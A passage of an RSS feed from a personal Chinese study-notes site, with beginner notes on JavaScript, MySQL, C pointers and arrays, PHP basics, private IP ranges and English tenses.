ES5 中不支持 with 函数。
 var obj = {  age: &amp;#34;456&amp;#34;,  name: &amp;#34;your&amp;#34;, }  function test() {  var age = &amp;#39;123&amp;#39;;  var name = &amp;#39;my&amp;#39;;  with (obj) {  // 下面的输出不会返回自身作用域（test 函数的作用域）下的 age 和 name。  // 只会返回全局作用域下的 obj 对象的 age 和 name，因为作用域被 with 函数改变了。  console.log(age);  console.log(name);  } } test(); 替代链式调用 with (document) {  write(&amp;#34;with 调用&amp;#34; + &amp;#34;&amp;lt;br/&amp;gt;&amp;#34;) }  //等同于 document.</description>
    </item>
    
    <item>
      <title>MySQL</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/mysql/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/mysql/</guid>
      <description>MySQL MySQL 属于 Oracle。
MySQL 的优点  成本低：开源数据库，完全免费，社区庞大。 性能高：执行速度快。 简单：体积小，简单易用。 跨平台：支持多种操作系统。  </description>
    </item>
    
    <item>
      <title>MySql DBMS</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dbms/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dbms/</guid>
      <description>DBMS 数据库管理系统（Datebase Management System），我们可以通过 DBMS 来创建或操作数据库。
常见的数据库管理系统：MySQL、Oracle、DB2、SqlServer
基于共享文件系统 比如微软的 Access
基于 C/S 架构 基于客户机/服务器的 DBMS。需要安装客户端和服务端
比如 MySQL、Oracle、SqlSever。</description>
    </item>
    
    <item>
      <title>MySQL SQL</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/sql/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/sql/</guid>
      <description>SQL 结构化查询语言（Structure Query Language），专门用来对数据库进行一些操作的语言。
SQL 的优点 SQL 语言不是某个特定 DBMS 所专有的语言，相反，近乎所有的 DBMS 都支持 SQL。
SQL 的语言分类 DQL 数据查询语言 select。
DML 数据操作语言，用于对数据库表中的数据进行操作。
SELECT、INSERT、UPDATE、DELETE、CALL、EXPLAIN PLAN、LOCK TABLE
DDL 数据定义语言，用于对数据库、表层面进行操作。
CREATE、ALTER、DROP、TRUNCATE、COMMENT、GRANT、REVOKE
DCL 事务控制语言 COMMIT、SAVEPOINT、ROLLBACK、SET TRANSACTION</description>
    </item>
    
    <item>
      <title>MySQL 安装</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%AE%89%E8%A3%85/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%AE%89%E8%A3%85/</guid>
      <description>安装 去官方下载PHPStudy并安装，这玩意自带 MySQL 和 Apache。
配置环境变量 赋值 MySQL 目录下的 bin 路径，然后将这个路径添加到系统环境变量 Path 中。
我这里添加环境变量是的是：D:\AppInstallPath\PhpStudy\phpstudy_pro\Extensions\MySQL5.7.26\bin*</description>
    </item>
    
    <item>
      <title>MySQL 常用命令</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</guid>
      <description>常用命令 查询 MySQL 版本号 打开 cmd，直接使用 DOS 命令查看：
# 第一种命令查询 C:\Windows\system32&amp;gt;mysql --version mysql Ver 14.14 Distrib 5.7.26, for Win64 (x86_64) # 第二种命令查询 C:\Windows\system32&amp;gt;mysql -V mysql Ver 14.14 Distrib 5.7.26, for Win64 (x86_64) 显示数据库 使用show databases;命令来查看数据库，需要注意的是 database 后面的 s 和;符号。
mysql&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | study | | sys | | typecho | | wordpress | +--------------------+ 7 rows in set (0.</description>
    </item>
    
    <item>
      <title>MySQL 配置文件</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</guid>
      <description>配置文件 在 MySQL 根目录中，有一个my.ini配置文件。
客户端配置 [mysql]是 MySQL 客户端的配置。
[mysql] default-character-set=utf8 服务端配置 [mysqld] port=3306 # MySQL 服务运行时的端口号 basedir=D:/AppInstallPath/PhpStudy/phpstudy_pro/Extensions/MySQL5.7.26/ # MySQL 程序所存放路径,常用于存放 MySQL 启动、配置文件、日志等 datadir=D:/AppInstallPath/PhpStudy/phpstudy_pro/Extensions/MySQL5.7.26/data/ # MySQL数据存放文件(极其重要) character-set-server=utf8 # 数据库和数据库表的默认字符集。(推荐utf8,以免导致乱码) default-storage-engine=MyIsam # MySQL 的存储引擎 # ...... </description>
    </item>
    
    <item>
      <title>数据库</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E6%95%B0%E6%8D%AE%E5%BA%93/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E6%95%B0%E6%8D%AE%E5%BA%93/</guid>
      <description>What is 数据库 数据库（Database），通俗的说，它存储了一系列有组织的数据，像一个“仓库”，简称 DB。
为什么要学习数据库？ 数据库可以实现数据的持久化。
使用完整的管理系统对数据进行同意管理，易于查询。
数据库的特点  数据不是直接放到数据库中的，而是先将数据放到表中，再将表放到库中。 一个数据库中可以有多个表，每个表都有一个的名字，用来标识自已，且表名具有唯一性。 表具有一些特性，这些特性定义了数据在表中如何存储。 表由列（字段）组成，每个表都有一个或多个列组成。 表中的数据是按行储存的。  </description>
    </item>
    
    <item>
      <title>C for</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/for/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/for/</guid>
      <description>for 执行 1，判断 2，当 2 为 true 时则执行 A，之后再执行 3，此后一直判断 2，直到 2 为 false 时并结束循环；如果 2 为 false，则直接结束循环。
for(1; 2; 3) {  A; } 其中：
1 只执行一次。
3 执行完后才意味着一次 for 循环执行完毕。
3 执行完后一定会再执行一次 2，且不管表达式 2 的结果为 true 或 false 都会执行一次 2。
#include &amp;lt;stdio.h&amp;gt;int main(void) { 	int sum = 0; 	for (int i = 1;i &amp;lt; 10;i++) 	printf(&amp;#34;%d\n&amp;#34;, i); 	//0 - 10 的自然数。 } 1 - 10 所有奇数之和 #include &amp;lt;stdio.</description>
    </item>
    
    <item>
      <title>C if</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/if/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/if/</guid>
      <description>if 在程序当中,并不是所有的语句都是自上而下依次的执行，有时候会依据条件来选择性的执行某段代码，这个时候就需要用到 if 语句。
如果 1 为真，则执行 A；如果 1 为假，则不执行 A。
#include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (1) 	A； } #include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (2 &amp;gt; 1) 	printf(&amp;#34;if 语句为 true\n&amp;#34;); } if 语句默认只能控制 A，不能控制 B（即无论 1 为 true 还是 false， B 都会执行）。
#include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (1) 	A; 	B; } #include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (2 &amp;gt; 1) 	printf(&amp;#34;被 if 语句控制\n&amp;#34;); 	printf(&amp;#34;不被 if 语句控制\n&amp;#34;); } if 语句默认只能控制一个 A，如果想控制多个语句（A 和 B），就必须将 A 和 B 用 {} 括起来。</description>
    </item>
    
    <item>
      <title>C malloc</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/malloc/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/malloc/</guid>
      <description>malloc malloc 是 memory（内存）allocate（分配）的缩写。
可以让一个变量动态分配内存。
malloc 函数的使用 #include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  int a = 5; // a 是一个 int 变量，它是静态分配的  int * p = (int *)malloc(4); // 动态分配  *p = 5;// *p 也是一个 int 变量，但它是动态分配的  free(p); // 手动释放动态分配的内存  printf(&amp;#34;%d\n&amp;#34;,*p);  printf(&amp;#34;%d\n&amp;#34;,p); }  使用 malloc 函数，需要添加头文件 malloc.h malloc 函数只有一个形参，并且形参是整型。 malloc(4)表示请求系统为我们分配 4 个字节 malloc 函数只能返回第一个字节的地址，即 p 只保存了第一个字节的整型地址 int * 是为了让系统知道我们分配这个 4 个字节的地址是整型地址。 int * p = (int *)malloc(4)这行代码总共分配了 8 个字节，int * p分配了 4 个字节，(int *)malloc(4)分配了 84 个字节一共 8 个字节。 p（int * p）本身所占的内存是静态分配的，但 p 所指向的内存(int *)malloc(4)是动态分配的。 free(p)表示将 p 所指向的内存给释放掉，使得 p 指向的内存无法被读写。但是，p 本身的内存是静态的，不能被我们用free()函数手动释放，p 本身的内存只能在 p 变量所在的函数运行结束后，被系统自动释放。 *p = 5和int a = 5的区别在于前者的内存分配方式是动态分配的，后者的内存分配方式是静态分配的。 *p = 5 中，其中*p指的是用(int *)malloc(4)动态分配了 4 个字节的内存空间，而*p = 5，则是将 5 这个 int 数值放入这动态分配的 4 个字节的内存中。而 p 则只保存了其中第 1 个字节的地址。  </description>
    </item>
    
    <item>
      <title>C 流程控制</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</guid>
      <description>流程控制 流程控制也叫控制结构，控制程序应该如何执行代码。
顺序控制 从上到下的执行代码，中间没有任何判断或跳转。
选择控制 某些代码可能执行，也可能不执行，有选择的执行某些代码。
循环控制 某些代码被重复执行。</description>
    </item>
    
    <item>
      <title>English 动词短语和介词短语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E7%9F%AD%E8%AF%AD%E5%92%8C%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E7%9F%AD%E8%AF%AD%E5%92%8C%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD/</guid>
      <description>动词短语和介词短语 它们的区别 动词短语 动词短语虽然由多个词语构成，但它实际上是一个整体，只能将它当作一个词语看待，因为它与普通的动词是一样的。
动词和介词构成的动词短语也叫复合动词，属于实义动词的范畴。
 look at get up look for  介词短语 介词短语的介词是放在开头的，后面跟一个名词/代词/数词/动名词/可以构成一个介词短语。
介词可以根据自身的规则构成很多个意义不同的介词短语，而动词短语是一个固定的实义动词，有固定的意思和作用。
介词短语是一个真正意义上的短语，
动词短语不属于短语，只是一个动词。
因为动词短语中的介词和介词短语中的介词看起来样的，所以，这很容易让我们将这两者混用。</description>
    </item>
    
    <item>
      <title>English 一般过去时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E8%BF%87%E5%8E%BB%E6%97%B6%E6%80%81/</link>
      <pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E8%BF%87%E5%8E%BB%E6%97%B6%E6%80%81/</guid>
      <description>一般过去时态 表示的曾经发生的一些动作和状态，也就是已经过去的一些事物。
一般过去时态的时间状语 一般情况，一般过去时态需要加上表示过去的时间状语。
 yesterday. just now. before.  大部分表示过去的时间状语，都是由介词或副词跟其他的词语构成的，一般有下面一种构成方式。
在副词 ago（&amp;hellip;之前）加上表示时间的词语。 One/a/an + 表示时间名词的单数 + ago.
数词（大于 1 的数词） + 表示时间名词的复数 的复数 + ago.
 a day ago. One year ago. Three days ago.  在 in 后面加上一个表示过去年份的数词。  I was run in 2022. I was study in 2022.  在副词 last 后面加上表示时间的名词。 Last（上一个） + 表示时间的名词的单数。
 Last hour. Last week. Last month. I was tired last night. She was busy last week.</description>
    </item>
    
    <item>
      <title>C 一个指针变量占几个字节</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E4%B8%80%E4%B8%AA%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%E5%8D%A0%E5%87%A0%E4%B8%AA%E5%AD%97%E8%8A%82/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E4%B8%80%E4%B8%AA%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F%E5%8D%A0%E5%87%A0%E4%B8%AA%E5%AD%97%E8%8A%82/</guid>
      <description>一个指针变量占几个字节 在 64 位系统中，一个指针变量占 4 个字节，不管这个指针指向的是什么类型的变量。
在 64 位系统中，一个指针变量占 8 个字节，不管这个指针指向的是什么类型的变量。
sizeof() 此函数可以返回指定数据类型所占的字节。
#include &amp;lt;stdio.h&amp;gt; int main () {  int a = 666;  char ch = &amp;#39;A&amp;#39;;  double dou = 99.9;  int*p = &amp;amp;a;  char *c = &amp;amp;ch;  double *x = &amp;amp;dou;  // 不过什么数据类型的指针变量，  // 所占字节都是 8 个（32 位系统占 4 个字节）  printf(&amp;#34;%d\n&amp;#34;,sizeof(p));  printf(&amp;#34;%d\n&amp;#34;,sizeof(c));  printf(&amp;#34;%d\n&amp;#34;,sizeof(x)); } 虽然在 64 位系统中的指针变量占 8 个字节，但是一个变量的地址（指针变量）只会存放该变量首字节的地址。这样，指针变量通过首字节的地址，就能知道自己所指向的变量类型，也就知道了该指针变量所指向的变量到底占多少个字节。</description>
    </item>
    
    <item>
      <title>C 动态分配内存</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%8A%A8%E6%80%81%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98/</guid>
      <description>动态内存分配 传统数组的缺点 传统数组也叫静态数组，也属于静态内存
  数组长度必须事先指定，且只能是长整数，不能是变量。
  传统形式定义的数组，该数组的内存无法被我们手动释放。因为系统为该数组分配的储存空间就会一直存在，除非数组所在的函数运行完毕，数组的空间才会被系统释放。
#include &amp;lt;stdio.h&amp;gt;void fun(void){  // 这 20 个字节（4 个 int ）的储存空间无法被我们手动的释放，  // 只能在本函数（fun 函数）运行完毕后由系统自动释放  int a[5] = {1,2,3,4,5}; } int main () {  }   数组的长度一旦定义，其长度就不能再被更改。也就是数组的长度不能在函数运行的过程中动态的扩充或缩小。
  Ａ 函数中定义的数组，在 Ａ 函数运行期间可以被其他函数使用，但 A 函数运行完毕之后，A 函数中的数组将无法在被其他函数使用（A 函数在运行完毕后，就会被系统释放）。
  动态数组（动态内存） 动态数组很好的解决了传统数组的 4 个缺点，传统数组也叫静态数组，</description>
    </item>
    
    <item>
      <title>English 一般现在时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E7%8E%B0%E5%9C%A8%E6%97%B6%E6%80%81/</link>
      <pubDate>Wed, 30 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E7%8E%B0%E5%9C%A8%E6%97%B6%E6%80%81/</guid>
      <description>一般现在时态 指的是从过去到现在直至将来的一段时间内发生的动作或存在的状态
一般现在时态的用法 当表示经常性、习惯性、有规律性的动作和状态的时候 另外，表示真理性、客观性的动作和状态也要使用一般现在时态。
比如：地球是圆的，太阳从东边升起，1 + 1 = 2.
表示不轻易改变的状态 什么叫不轻易改变的状态？比如：
“他是一个男孩”，“是男的”这个状态不会轻易变成“是女的”这个状态。
“这个房子很大”，因为大房子是不会轻易变小的，所以这也要用一般现在时态。
表示此时此刻的状态  I am tired now. I am busy now.  一般现在时态的时间状语 一般现在时态的时间状语都是表示经常性、习惯性或有规律性的词语。比如：
 every day every week On Sunday In the Morning  以上都是一些时间状语。
 She gets up very late on Sunday. I get up at 9:00 every morning. I never drink wine. I often play basketball.  </description>
    </item>
    
    <item>
      <title>English 时态是什么</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E6%97%B6%E6%80%81%E6%98%AF%E4%BB%80%E4%B9%88/</link>
      <pubDate>Mon, 28 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E6%97%B6%E6%80%81%E6%98%AF%E4%BB%80%E4%B9%88/</guid>
      <description>时态是什么 时态其实就是一个谓语动词随着时间的变化而发生不同形态的变化。
不同的时态用来表示不同的时间状态。
 I bought a book yesterday. I will a book tomorrow. I buy a book ever day.  可以看出，英语的谓语动词发生了多种形式的变化：bought、will buy、buy，另外中文的时间状语放在中间，而英文的时间状语放在句尾（是少数情况下也会放在句尾，比如书面语）。
英语中有 16 种时态。常用的有 10 种：
 一般现在时态 一般过去时态 一般将 来时态 现在进行时态 现在完成时态 过去完成时态 过去将来时态 过去进行时态 现在完成进行时态 将来进行时态  其他的六种比较少用，主要出现在书面语中。</description>
    </item>
    
    <item>
      <title>C 一维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>一维数组 定义一个一维数组时：
为 n 个变量连续分配储存空间。
数组中的所有元素，数据类型必须一致。
数组中所有变量所占的字节必须一样。
定义一维数组 #include &amp;lt;iostream&amp;gt;int main(){  // 完全初始化  int arr[5] ={1,2,3,4,5};  // 不完全初始化，未初始化的元素的值为 0  int arr2[5] ={1,2,3};  // 打印索引为 4 的值，但 arr2 中没有索引为 3 的值，因此这里返回 0  printf(&amp;#34;%d\n&amp;#34;,arr2[3]);  // 不初始化，所有元素都是垃圾值  int arr3[5];  printf(&amp;#34;%d\n&amp;#34;,arr3[5]);  // 清零，将数组中的每个元素的值都变成 0  int arr4[5] = {0}; } 错误的定义 只有在定义数组的同时，才可以整体赋值，
其他情况下整体复制都是错误的。
#include &amp;lt;iostream&amp;gt;int main(){  int a[5];  // a[5] 表示 a 数组中索引为 5 的值。  a[5] = {1,2,3,4,5}; } 将数组 a 中的值全部复制到数组 b #include &amp;lt;iostream&amp;gt; int main() { // 错误的写法，因为一维数组名，d该数组中第一个元素的地址  b = a; // 正确的写法  for(int i = 0; i &amp;lt; 5; i++ )  {  b[i] = a[i];  } } </description>
    </item>
    
    <item>
      <title>C 二维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%95%B0%E7%BB%84/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>二维数组 一个二维数组，在本质上，是一个一维数组的列表。它声明了一个 x 行 y 列的二维整型数组。
#include &amp;lt;iostream&amp;gt; int main(){  // 该数组中总共有12个元素，可以当作 3 行(一)5 列（丨）来看  int arr[3][4];  // 这个二位数组以此为：  arr[0][0] arr[0][1] arr[0][2] arr[0][3]  arr[1][0] arr[1][1] arr[1][2] arr[1][3]  arr[2][0] arr[2][1] arr[2][2] arr[2][3] } 声明一个二维数组 #include &amp;lt;iostream&amp;gt; int main() {  int arr[3][4] = {1,2,3,4,6,7,8,9,10,11,12};   int arr2[3][4] =  {  {1, 2, 3, 4},  {5, 6, 7, 8},  {9,10,11,12}  }; } 输出二维数组的内容 #include &amp;lt;iostream&amp;gt; int main() {  int arr[3][4] =  {  {1, 2, 3, 4},  {5, 6, 7, 8},  {9,10,11,12}  };  int i,j;  for(i = 0; i &amp;lt; 3; ++i)  {  for(j = 0; j &amp;lt; 4; ++j)  { // 负号表示将输出的内容对其， // 3表示每个元素间隔3个光标到位置  printf(&amp;#34;%-3d &amp;#34;,arr[i][j]);  }  printf(&amp;#34;\n&amp;#34;);  } } 关于多维数组 不存在多维数组，因为内存是线性的</description>
    </item>
    
    <item>
      <title>C 指针和一维数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E5%92%8C%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E5%92%8C%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84/</guid>
      <description>指针和一维数组 一维数组名 一维数组的名字是一个指针常量，它存放的是数组一个元素的地址。
#include &amp;lt;iostream&amp;gt; int main() {  int a[5];  // 打印一维数组 a 中，第一个元素的地址  printf(&amp;#34;%#x\n&amp;#34;,&amp;amp;a[0]);  // 打印一维数组 a 的名字  printf(&amp;#34;%#x\n&amp;#34;,a); } 下标和指针的关系 如果 p 是一个指针变量，则 p[n] 永远等价于 *（p + n）
void DeterminesArray(int *arr, int lenght) {  for(int i = 0; i &amp;lt; lenght; i++)  {  printf(&amp;#34;%d\n&amp;#34;,*(arr + i));  // *(arr + i) 等价于 arr[i]  printf(&amp;#34;%d\n&amp;#34;,arr[i]);  } } 确定一个一维数组需要哪些参数 当一个函数要处理一个或多个一维数组时，我们需要接收该数组的那些信息。也就是如何让一个函数知道我们将要处理的是一个数组，而不是其他数据类型。</description>
    </item>
    
    <item>
      <title>C 指针的运算</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E8%BF%90%E7%AE%97/</link>
      <pubDate>Thu, 24 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E6%8C%87%E9%92%88%E7%9A%84%E8%BF%90%E7%AE%97/</guid>
      <description>指针的运算 指针变量不能相加不能相乘也不能相除。 如果两个指针变量指向的是同一块连续空间中的不同存储单元（比如数组），则这两个指针变量才可以相减（表示两个元素相隔多少个元素/字节）</description>
    </item>
    
    <item>
      <title>私有地址</title>
      <link>https://note.yxzi.xyz/note/technology/internet/%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80/</link>
      <pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/%E7%A7%81%E6%9C%89%E5%9C%B0%E5%9D%80/</guid>
      <description>私有地址 私有 IP 地址是一段保留的 IP 地址。只使用在局域网中，无法在 Internet 上使用。
NAT－Network Address Translation 网络地址转换
私有地址范围： A 类 10.0.0.0/8， 即 10.0.0.0&amp;ndash;10.255.255.255
B 类 172.16.0.0/12， 即 172.16.0.0&amp;ndash;172.31.255.255
C 类 192.168.0.0/ 16， 即 192.168.0.0&amp;ndash;192.168.255.255</description>
    </item>
    
    <item>
      <title>English 英语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%8B%B1%E8%AF%AD/</link>
      <pubDate>Mon, 14 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%8B%B1%E8%AF%AD/</guid>
      <description>英语中的很多单词都有格式变化，喜欢用变化来表达一个词语的不同意义，这是英语的一大特点。
时态是英语语法的一大特色，也是和中文语法最大的区别之一</description>
    </item>
    
    <item>
      <title>PHP 数据类型</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link>
      <pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid>
      <description>数据类型 在 PHP 中，指的是一个变量所存储的数据本身的类型，而不是变量的类型，即变量本身是没有数据类型的。
基本数据类型 int/integer 占 4 个字节，表示整数类型，前提是存的下，当整型存不下的时候，将会变为 double 类型。
PHP 中提供了四种整型的定义方式：十进制定义、二进制定义、八进制定义和十六进制定义。
// 十进制 $decimal = 20;  // 二进制 $Binary = 10100;  // 八进制 $Octal = 1747;  // 十六进制 $HexaDecimal = 0x3E7;  echo $decimal . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo $Binary . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo $Octal . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; echo $HexaDecimal . &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; float/double 占 8 个字节，表示小数或者是整型所存不下的整数。
string 所占字节根据长度分配，表示字符串。
bool/boolean 表示 true 或 false.
复合数据类型 object 存放对象。
array 次性存放多个数据。
特殊数据类型 resource 存放资源数据，比如 PHP 外部数据（数据库、文件等）</description>
    </item>
    
    <item>
      <title>PHP 常量</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%B8%B8%E9%87%8F/</link>
      <pubDate>Wed, 09 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E5%8F%98%E9%87%8F/%E5%B8%B8%E9%87%8F/</guid>
      <description>常量 顾名思义，指的是不能被改变的变量。
在 PHP 中，常量有两种定义方式（5.3 之后才有两种）
定义 define() define(&amp;#39;PI&amp;#39;, 3.14); echo PI, &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; const() const PII = 18; echo PII; 定义特殊常量
define(&amp;#39;-_-&amp;#39;, &amp;#39;smile&amp;#39;); // 输出失败 // echo -_-; // 输出成功 echo constant(&amp;#39;-_-&amp;#39;); 这种特殊符号的常量无法用 一般的方式来输出，必须使用 constant() 来输出。
命名规则  常量不需要使用 $ 符号，因为一旦使用 $，系统就会认为这是变量。 常量的名字组成由字母、 数字和下划线组成，不能以数字开头。 常量的名字通常是以大写字母为主（主要是与变量以示区别）。 常量命名的规则比变量要松散， 可以使用一些特殊字符，但该方式只能使用 define 定义。  常量和变量的使用  数据可能变化的， 那么肯定是用变量。 数据不一定会变的，可以使用常量或者变量（变量居多） 数据不允许被修改的， 务必用常量。  系统常量 PHP_ VERSION：PHP 版本号。 PHP INT SIZE**：整型数据所占的字节数。 PHP_ INT_MAX：整型能表示的最大值（PHP 中整型是允许出现负数的）
系统魔术常量 在 PHP 中，还有一些特殊的系统常量，他们由 __ 开始 + 常量名 + __，这种常量称之为系统魔术常量。</description>
    </item>
    
    <item>
      <title>PHP 环境配置</title>
      <link>https://note.yxzi.xyz/note/technology/language/php/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 02 Mar 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/php/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>环境配置 下载 PHPStudy PHPStudy 是一个 windows 下的 Apache/Ngnix+PHP+MySQL 的集成开发环境
 解压运行 选择安装目录，通常时 D 盘，我这里是D:\AppInstallPath\PhpStudy  安装完成后，打开 PHPStudy，会出现以下界面：
![下载 PHPStudy](.assets/下载 PHPStudy.png)
另外，PHPStudy 会在安装目录下的 phpstudy_pro\Extensions 路径形成目录结构：
![image-20220303002959290](E:\Github\MyBlog\content\mynote\4 Specialty\Language\PHP\PHP 环境配置.assets\image-20220303002959290.png)
在这里我们只需要注意 MySql 和 php 的路径，因为之后我们会用到这两个路径来配置环境变量。
